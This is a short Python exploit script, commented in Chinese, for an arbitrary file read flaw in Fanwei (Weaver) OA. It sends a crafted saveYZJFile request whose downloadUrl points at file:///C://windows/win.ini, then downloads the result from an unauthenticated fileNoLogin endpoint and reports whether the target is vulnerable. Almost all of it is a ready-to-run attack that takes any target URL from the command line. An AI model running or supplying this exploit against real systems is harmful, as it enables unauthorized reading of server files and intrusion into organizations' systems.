#泛微任意文件读取
import sys
import requests
import json
def fanwei_windows():
    req = requests.session()
    payload = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt'
    exp = '/file/fileNoLogin/'
    url = sys.argv[1]
    head = {
        'Proxy-Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }
    payload = url+payload
    html = req.get(payload,headers=head).text
    html_dic = json.loads(html) #换成字典类型
    exp = url+exp+html_dic['id']
    try:
        s = req.get(exp,headers=head)
        if s.status_code == 200:
            print("[+] " + url + " 存在漏洞")
    except:
        print("[-] 漏洞不存在")
if __name__ == '__main__':
    try:
        fanwei_windows()
    except json.decoder.JSONDecodeError:
        print("使用方法： python exp.py http://ip:port  url后不需要加“/”")
    except KeyError:
        print("[-] 漏洞不存在")
